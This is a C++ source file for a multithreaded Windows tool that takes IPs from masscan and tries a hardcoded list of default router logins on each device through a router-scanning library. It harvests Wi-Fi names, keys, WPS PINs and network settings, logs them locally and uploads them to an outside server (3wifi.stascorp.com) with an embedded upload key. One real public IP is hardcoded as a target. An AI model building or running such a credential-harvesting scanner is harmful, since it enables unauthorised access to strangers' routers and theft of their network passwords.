#include "stdafx.h"
#include "Windows.h"
#include <wininet.h>

#pragma comment (lib, "wsock32.lib")
#pragma comment(lib,"wininet")

typedef enum : BYTE
{
	NONE,
	LOADING,
	DONE
} SCAN_STATE;

typedef struct
{
	SCAN_STATE state;
	char *wanIP;
	char *auth;
	char *type;
	char *bssid;
	char *radioOff;
	char *hidden;
	char *essid;
	char *security;
	char *key;
	char *wpspin;
	char *lanIP;
	char *lanmask;
	char *wanmask;
	char *wangate;
	char *dns;

} WORKER_RESULT;

typedef struct _THREAD_DEBUG_INFO
{
	_THREAD_DEBUG_INFO* nextEntry;
	_THREAD_DEBUG_INFO* prevEntry;
	WORKER_RESULT result;
	unsigned long threadId;
	HANDLE hRouter;
	HANDLE hThread;
	DWORD ip;
	WORD port;
	unsigned long secondsOfRunning;
	bool stopProcessing;
	unsigned long secondsOfStoping;
} THREAD_DEBUG_INFO;

typedef struct
{
	unsigned long ip;
	unsigned short port;
} PIPE_OUTMESSAGE;

THREAD_DEBUG_INFO *startThreadInfo = NULL;

typedef bool(__stdcall *_rsapiInitialize)();
typedef bool(__stdcall *_rsapiSetParam)(DWORD st, DWORD value);
typedef bool(__stdcall *_rsapiPrepareRouter)(DWORD row, DWORD ip, WORD port, HANDLE *hRouter);
typedef bool(__stdcall *_rsapiScanRouter)(HANDLE hRouter);
typedef bool(__stdcall *_rsapiStopRouter)(HANDLE hRouter);
typedef bool(__stdcall *_rsapiFreeRouter)(HANDLE hRouter);

_rsapiInitialize rsapiInitialize = NULL;
_rsapiSetParam rsapiSetParam = NULL;
_rsapiPrepareRouter rsapiPrepareRouter = NULL;
_rsapiScanRouter rsapiScanRouter = NULL;
_rsapiScanRouter rsapiStopRouter = NULL;
_rsapiFreeRouter rsapiFreeRouter = NULL;

char pairsDigest[] = "admin	<empty>\
	admin	admin\
	admin	admin1\
	admin	1234\
	admin	password\
	Admin	Admin\
	root	<empty>\
	root	admin\
	root	root\
	root	public\
	admin	nimda\
	admin	adminadmin\
	admin	gfhjkm\
	admin	airlive\
	airlive	airlive\
	mts	mgtsoao\
	admin	12345abc\
	support	<empty>\
	support	support\
	super	super\
	super	APR@xuniL\
	super	zxcvbnm,./\
	adsl	realtek\
	osteam	5up\
	root	toor\
	ZXDSL	ZXDSL";

#define UPLOAD_BUFFER_SIZE 4096

unsigned int dwMaxActiveThreads = 600;
unsigned int dwActiveThreads = 0;

CRITICAL_SECTION ciThreadInfoLock;
CRITICAL_SECTION ciSaveResult;

bool debugModeEnabled = false;


bool sendResultToServer(char* data)
{
	LPWSTR contentType = TEXT("Content-Type: text/plain");

	HINTERNET hInternet = InternetOpen(TEXT("3Wifi Masscan"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hConnect = InternetConnect(hInternet, TEXT("3wifi.stascorp.com"), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1u);
	HINTERNET hRequest = HttpOpenRequest(hConnect, TEXT("POST"), TEXT("3wifi.php?a=upload&key=1SvbcPUVeiFm9OtJ8B6HLVFyaLSMuhNk"), NULL, NULL, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP, 1);
	
	bool bResult = HttpSendRequest(hRequest, contentType, wcslen(contentType), data, strlen(data));
	if (bResult)
	{
		printf("UPLOADED!\r\n");
	}

	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	return bResult;
}

bool InitRouterScanLib()
{
	HMODULE hRSL = LoadLibraryA("librouter.dll");
	if (hRSL == NULL)
	{
		return false;
	}

	rsapiInitialize = (_rsapiInitialize)GetProcAddress(hRSL, "Initialize");
	rsapiSetParam = (_rsapiSetParam)GetProcAddress(hRSL, "SetParamA");
	rsapiPrepareRouter = (_rsapiPrepareRouter)GetProcAddress(hRSL, "PrepareRouter");
	rsapiScanRouter = (_rsapiScanRouter)GetProcAddress(hRSL, "ScanRouter");
	rsapiStopRouter = (_rsapiStopRouter)GetProcAddress(hRSL, "StopRouter");
	rsapiFreeRouter = (_rsapiFreeRouter)GetProcAddress(hRSL, "FreeRouter");

	if (rsapiInitialize == NULL ||
		rsapiSetParam == NULL ||
		rsapiPrepareRouter == NULL ||
		rsapiScanRouter == NULL ||
		rsapiStopRouter == NULL ||
		rsapiFreeRouter == NULL ||
		!rsapiInitialize())
	{
		FreeLibrary(hRSL);
		return false;
	}

	return true;
}

SCAN_STATE getScanState(char* state)
{
	if (memcmp(state, "Loading", sizeof("Loading")-1) == 0)
	{
		return LOADING;
	}
	if (memcmp(state, "Done", sizeof("Done")-1) == 0)
	{
		return DONE;
	}
	return NONE;
}

void processResult(THREAD_DEBUG_INFO *res)
{
	char data[1024] = { 0x00 };
	
	struct in_addr paddr;
	paddr.S_un.S_addr = ntohl(res->ip);

	unsigned int dataLen = sprintf(data, "%s\t%i\t%i\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t\r\n",
		inet_ntoa(paddr),
		res->port,
		0, // timeout in ms
		"Done", // status placeholder
		(res->result.auth == NULL ? "" : res->result.auth),
		(res->result.type == NULL ? "" : res->result.type),
		(res->result.radioOff == NULL ? "" : res->result.radioOff),
		(res->result.hidden == NULL ? "" : res->result.hidden),
		(res->result.bssid == NULL ? "" : res->result.bssid),
		(res->result.essid == NULL ? "" : res->result.essid),
		(res->result.security == NULL ? "" : res->result.security),
		(res->result.key == NULL ? "" : res->result.key),
		(res->result.wpspin == NULL ? "" : res->result.wpspin),
		(res->result.lanIP == NULL ? "" : res->result.lanIP),
		(res->result.lanmask == NULL ? "" : res->result.lanmask),
		(res->result.wanIP == NULL ? "" : res->result.wanIP),
		(res->result.wanmask == NULL ? "" : res->result.wanmask),
		(res->result.wangate == NULL ? "" : res->result.wangate),
		(res->result.dns == NULL ? "" : res->result.dns),
		"", // latitude placeholder
		"", // longitude placeholder
		""  // comment placeholder
	);

	FILE *f = fopen("scanlog.txt", "ab");
	fwrite(data, dataLen, 1, f);
	fclose(f);

	sendResultToServer(data);
}

bool callbackRouterScan(WORKER_RESULT *res /* table row as prt*/, char* name, char* value)
{
	WORD slen;

	if (strcmp(name, "Status") == 0)
	{
		res->state = getScanState(value);
	}
	if (strcmp(name, "Auth") == 0)
	{
		slen = strlen(value) + 1;
		res->auth = new char[slen];
		memset(res->auth, 0x00, slen);
		strcpy(res->auth, value);
	}
	if (strcmp(name, "Type") == 0)
	{
		slen = strlen(value) + 1;
		res->type = new char[slen];
		memset(res->type, 0x00, slen);
		strcpy(res->type, value);
	}
	if (strcmp(name, "BSSID") == 0)
	{
		slen = strlen(value) + 1;
		res->bssid = new char[slen];
		memset(res->bssid, 0x00, slen);
		strcpy(res->bssid, value);
	}
	if (strcmp(name, "SSID") == 0)
	{
		slen = strlen(value) + 1;
		res->essid = new char[slen];
		memset(res->essid, 0x00, slen);
		strcpy(res->essid, value);
	}
	if (strcmp(name, "WANIP") == 0)
	{
		slen = strlen(value) + 1;
		res->wanIP = new char[slen];
		memset(res->wanIP, 0x00, slen);
		strcpy(res->wanIP, value);
	}
	if (strcmp(name, "RadioOff") == 0)
	{
		slen = strlen(value) + 1;
		res->radioOff = new char[slen];
		memset(res->radioOff, 0x00, slen);
		strcpy(res->radioOff, value);
	}
	if (strcmp(name, "Hidden") == 0)
	{
		slen = strlen(value) + 1;
		res->hidden = new char[slen];
		memset(res->hidden, 0x00, slen);
		strcpy(res->hidden, value);
	}
	if (strcmp(name, "Sec") == 0)
	{
		slen = strlen(value) + 1;
		res->security = new char[slen];
		memset(res->security, 0x00, slen);
		strcpy(res->security, value);
	}
	if (strcmp(name, "Key") == 0)
	{
		slen = strlen(value) + 1;
		res->key = new char[slen];
		memset(res->key, 0x00, slen);
		strcpy(res->key, value);
	}
	if (strcmp(name, "WPS") == 0)
	{
		slen = strlen(value) + 1;
		res->wpspin = new char[slen];
		memset(res->wpspin, 0x00, slen);
		strcpy(res->wpspin, value);
	}
	if (strcmp(name, "LANIP") == 0)
	{
		slen = strlen(value) + 1;
		res->lanIP = new char[slen];
		memset(res->lanIP, 0x00, slen);
		strcpy(res->lanIP, value);
	}
	if (strcmp(name, "WANIP") == 0)
	{
		slen = strlen(value) + 1;
		res->wanIP = new char[slen];
		memset(res->wanIP, 0x00, slen);
		strcpy(res->wanIP, value);
	}	
	if (strcmp(name, "LANMask") == 0)
	{
		slen = strlen(value) + 1;
		res->lanmask = new char[slen];
		memset(res->lanmask, 0x00, slen);
		strcpy(res->lanmask, value);
	}	
	if (strcmp(name, "WANMask") == 0)
	{
		slen = strlen(value) + 1;
		res->wanmask = new char[slen];
		memset(res->wanmask, 0x00, slen);
		strcpy(res->wanmask, value);
	}
	if (strcmp(name, "WANGate") == 0)
	{
		slen = strlen(value) + 1;
		res->wangate = new char[slen];
		memset(res->wangate, 0x00, slen);
		strcpy(res->wangate, value);
	}
	if (strcmp(name, "DNS") == 0)
	{
		slen = strlen(value) + 1;
		res->dns = new char[slen];
		memset(res->dns, 0x00, slen);
		strcpy(res->dns, value);
	}
	return true;
}

THREAD_DEBUG_INFO* getLastTI()
{
	THREAD_DEBUG_INFO *ti;

	if (startThreadInfo == NULL)
	{
		return NULL;
	}

	ti = startThreadInfo;
	while (ti->nextEntry != NULL)
	{
		ti = ti->nextEntry;
	}
	return ti;
}

void addThreadInfo(THREAD_DEBUG_INFO *ti)
{
	EnterCriticalSection(&ciThreadInfoLock);
	if (startThreadInfo == NULL)
	{
		startThreadInfo = ti;
	}
	else
	{
		startThreadInfo->prevEntry = ti;
		ti->nextEntry = startThreadInfo;
		startThreadInfo = ti;
	}
	dwActiveThreads++;
	LeaveCriticalSection(&ciThreadInfoLock);
}

void removeThreadInfo(THREAD_DEBUG_INFO *ti)
{
	EnterCriticalSection(&ciThreadInfoLock);
	if (ti != NULL)
	{
		THREAD_DEBUG_INFO *prev = (THREAD_DEBUG_INFO*)ti->prevEntry;
		THREAD_DEBUG_INFO *next = (THREAD_DEBUG_INFO*)ti->nextEntry;

		if (prev != NULL)
		{
			prev->nextEntry = next;
		}
		if (next != NULL)
		{
			next->prevEntry = prev;
		}
		if (ti == startThreadInfo)
		{
			if (startThreadInfo->nextEntry != NULL)
			{
				startThreadInfo = startThreadInfo->nextEntry;
			}
			else
			{
				startThreadInfo = NULL;
			}
		}
		dwActiveThreads--;
	}
	LeaveCriticalSection(&ciThreadInfoLock);
}

void threadsControl()
{
	THREAD_DEBUG_INFO *ti;

	while(1)
	{
		EnterCriticalSection(&ciThreadInfoLock);
		if (startThreadInfo == NULL)
		{
			LeaveCriticalSection(&ciThreadInfoLock);
			continue;
		}

		ti = startThreadInfo;
		while (ti != NULL)
		{
			if (!ti->stopProcessing)
			{
				if (ti->secondsOfRunning > 60 * 15)
				{
					printf("Thread %i stopped\n", ti->threadId);
					ti->stopProcessing = true;
					rsapiStopRouter(ti->hRouter);
				}
				ti->secondsOfRunning++;
			}
			else
			{
				if (ti->secondsOfStoping > 60 * 5)
				{
					printf("Thread %i force terminated\n", ti->threadId);
					ti->stopProcessing = true;
					removeThreadInfo(ti);
					TerminateThread(ti->hThread, 0);
				}
				ti->secondsOfStoping++;
			}
			ti = ti->nextEntry;
		}
		LeaveCriticalSection(&ciThreadInfoLock);
		Sleep(1000);
	}
}

void _scanWorker(THREAD_DEBUG_INFO* ti)
{
	HANDLE hRouter = NULL;
	rsapiPrepareRouter((DWORD)&ti->result, ti->ip, ti->port, &hRouter);
	ti->hRouter = hRouter;
	
	rsapiScanRouter(hRouter);
	
	EnterCriticalSection(&ciSaveResult);
	processResult(ti);
	LeaveCriticalSection(&ciSaveResult);

	rsapiFreeRouter(hRouter);
	removeThreadInfo(ti);
	
	if (ti->result.auth != NULL) delete ti->result.auth;
	if (ti->result.type != NULL) delete ti->result.type;
	if (ti->result.bssid != NULL) delete ti->result.bssid;
	if (ti->result.radioOff != NULL) delete ti->result.radioOff;
	if (ti->result.hidden != NULL) delete ti->result.hidden;
	if (ti->result.essid != NULL) delete ti->result.essid;
	if (ti->result.security != NULL) delete ti->result.security;
	if (ti->result.key != NULL) delete ti->result.key;
	if (ti->result.wpspin != NULL) delete ti->result.wpspin;
	if (ti->result.lanIP != NULL) delete ti->result.lanIP;
	if (ti->result.lanmask != NULL) delete ti->result.lanmask;
	if (ti->result.wanIP != NULL) delete ti->result.wanIP;
	if (ti->result.wanmask != NULL) delete ti->result.wanmask;
	if (ti->result.wangate != NULL) delete ti->result.wangate;
	if (ti->result.dns != NULL) delete ti->result.dns;
	delete ti;
}

void startScanThread(DWORD ip, WORD port)
{
	HANDLE hThread = NULL;
	DWORD threadId = 0;

	THREAD_DEBUG_INFO *ti = new THREAD_DEBUG_INFO;
	memset(ti, 0x00, sizeof(THREAD_DEBUG_INFO));
	ti->ip = ip;
	ti->port = port;
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_scanWorker, (LPVOID)ti, CREATE_SUSPENDED, &threadId);
	ti->threadId = threadId;
	ti->hThread = hThread;
	addThreadInfo(ti);
	ResumeThread(hThread);
}

HANDLE connectToMasscanPipe()
{
	HANDLE hNamedPipe;
	hNamedPipe = CreateFileA("\\\\.\\pipe\\reamtimeMasscan", GENERIC_READ,
		0, NULL, OPEN_EXISTING, 0, NULL);
	return hNamedPipe;
}

void pipeReadThread(HANDLE hPipe)
{
	DWORD dwRead = 0;
	PIPE_OUTMESSAGE msg;

	while (1)
	{
		if (dwActiveThreads >= dwMaxActiveThreads)
		{
			continue;
		}
		ReadFile(hPipe, &msg, sizeof(PIPE_OUTMESSAGE), &dwRead, NULL);
		if (dwRead != 0)
		{
			startScanThread(msg.ip, msg.port);
		}
	}
}

void printfThreadsIPs()
{
	EnterCriticalSection(&ciThreadInfoLock);
	struct in_addr paddr;
	THREAD_DEBUG_INFO *ti = startThreadInfo;
	while (ti)
	{
		paddr.S_un.S_addr = ntohl(ti->ip);
		printf("Thread id: %i => %s:%i\n", ti->threadId, inet_ntoa(paddr), ti->port);
		ti = (THREAD_DEBUG_INFO*)ti->nextEntry;
	}
	LeaveCriticalSection(&ciThreadInfoLock);
}

void printfThreadInfo(unsigned long tId)
{
	EnterCriticalSection(&ciThreadInfoLock);
	struct in_addr paddr;
	THREAD_DEBUG_INFO *ti = startThreadInfo;
	while (ti)
	{
		if (ti->threadId == tId)
		{
			paddr.S_un.S_addr = ntohl(ti->ip);
			printf("Thread id: %i => IP:%s\n\tPort:%i\n\stopProcessing:%s\n", ti->threadId, inet_ntoa(paddr), ti->port, (ti->stopProcessing == 0 ? "false" : "true"));
			LeaveCriticalSection(&ciThreadInfoLock);
			return;
		}
		ti = (THREAD_DEBUG_INFO*)ti->nextEntry;
	}
	printf("Thread not founded!\n");
	LeaveCriticalSection(&ciThreadInfoLock);
}

int main()
{
	HANDLE hNamedPipe = NULL;
	DWORD dwRead = 0;
	PIPE_OUTMESSAGE msg;

	InitializeCriticalSection(&ciThreadInfoLock);
	InitializeCriticalSection(&ciSaveResult);

	if (!InitRouterScanLib())
	{
		ExitProcess(-1);
	}
	rsapiSetParam(3, (DWORD)callbackRouterScan);
	rsapiSetParam(9, (DWORD)pairsDigest);


	startScanThread(htonl(inet_addr("66.96.236.59")), 80);
	
	while (1)
	{

		Sleep(1000);
	}

	printf("Connecting to pipe... ");

	while (hNamedPipe == NULL)
	{
		hNamedPipe = connectToMasscanPipe();
		Sleep(500);
	}
	printf("ok\nPipe thread started.\nWorking...\n");

	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pipeReadThread, (LPVOID)hNamedPipe, 0, NULL);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)threadsControl, NULL, 0, NULL);

	HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
	DWORD dwCount;
	char szName[16];

	while (1)
	{
		ReadConsoleA(hStdin, &szName, 16, &dwCount, NULL);
		if (dwCount >= 2 &&
			'\n' == szName[dwCount - 1] &&
			'\r' == szName[dwCount - 2]) {
			szName[dwCount - 2] = '\0';
		}
		else if (dwCount > 0) {
			szName[dwCount] = '\0';
		}

		if (strcmp(szName, "stats") == 0)
		{
			printf("=== Threads ===\n");
			printfThreadsIPs();
			printf("=== End ===\n");
		}
		if (strcmp(szName, "ti") == 0)
		{
			printf("=== Thread %i info ===\n");
			printfThreadInfo(0);
			printf("=== End ===\n");
		}
		else
		{
			printf("Command not found!\n");
		}
	}

	return 0;
}

